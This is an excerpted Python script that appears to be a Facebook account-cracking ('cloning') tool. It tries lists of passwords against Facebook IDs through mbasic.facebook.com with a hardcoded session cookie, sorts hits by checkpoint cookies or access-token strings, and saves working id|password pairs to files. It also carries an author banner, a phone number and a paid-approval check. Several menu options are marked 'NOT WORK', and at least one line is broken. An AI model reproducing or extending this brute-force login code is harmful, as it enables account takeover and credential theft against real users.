...
{"authority": 'mbasic.facebook.com' ,
 ...
 "cookie": 'datr=PDKhY7QJzcRo_CGBRmrGvLs1; sb=PDKhYyzyGgfTZNJjZA7TIXQi; wd=360x696; fr=0l2y1bdtrHdwltzBF..BjoTI8.ea.AAA.0.0.BjoTT4.AWVnweknPnU' ,
...
def crack(idf,pwv):
	...
	sys.stdout.write('\r %s[ 𝙓𝙄𝙔𝘼𝘿 ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print( f'\r\x1b[1;91m [ 𝙓𝙄𝙔𝘼𝘿-CP ] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [ 𝙓𝙄𝙔𝘼𝘿-OK ] {idf} | {pw}')
				...
				open('/sdcard/ids/𝙓𝙄𝙔𝘼𝘿-OK.txt','a').write('%s\n' % wrt)
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				rint( f'\r\x1b[1;91m [ 𝙓𝙄𝙔𝘼𝘿-CP ] {idf} | {pw}')
				...
				open('/sdcard/𝙓𝙄𝙔𝘼𝘿-OK.txt','a').write('%s\n' % wrt)
...
\033[41m\033[1;37m[Your]   [DaD]   [XIYAD]   [RXI]\x1b[0m

\033[1;32m┌───────────────────────────────────────┐

\033[1;33m│ [✓] AUTHOR   : RIYAD\033[1;32m[RX]                                            │

\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37mXIYAD\x1b[0m                    │

\033[1;35m│ [✓] WHATSAPP :  +88017782*****                                                 │

\033[1;36m│ [✓] POWER RX : \x1b[1;32mPRO XIYAD\x1b[1;97m                    │

\033[1;32m└───────────────────────────────────────┘  

         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [𝙓𝙄𝙔𝘼𝘿] [🤦‍♂️]  [RXI]\x1b[0m    """)
...
class Main:
	...
	def __init__(self):
		...
		print("\033[1;32m➥[1]\033[1;33m𓆩FILE CLONING𓆪\033[1;34m[NOT WORK]")

		print("\033[1;32m➥[2]\033[1;35m𓆩PUBLIC CLONING𓆪\033[1;35m[NOT WORK]")

		print("\033[1;36m➥[3]\033[1;32m𓆩FILE CRATE𓆪\033[1;36m[NOT WORK]")
...
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
		...
		sys.stdout.write(
			...
			"\r [ 𝙓𝙄𝙔𝘼𝘿 ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[ 𝙓𝙄𝙔𝘼𝘿-OK ] %s | %s\033[0;97m         "%(uid, pw))
				...
				open("2009-𝙓𝙄𝙔𝘼𝘿-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
...
def Subscraption():
	...
	if key1 in r1:
		...
		print(" \033[1;32m 𝙓𝙄𝙔𝘼𝘿 Toll Paid You Need Get Approved First\033[1;37m\n")
		...
		os.system('am start https://wa.me/+8801778271406?text=' + tks)
...
\033[41m\033[1;37m[Your]   [DaD]   [XIYAD]   [RX]\x1b[0m
...
\033[1;32m└───────────────────────────────────────┘  
         ...
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [𝙓𝙄𝙔𝘼𝘿] [🤦‍♂️|]\x1b[0m    """)
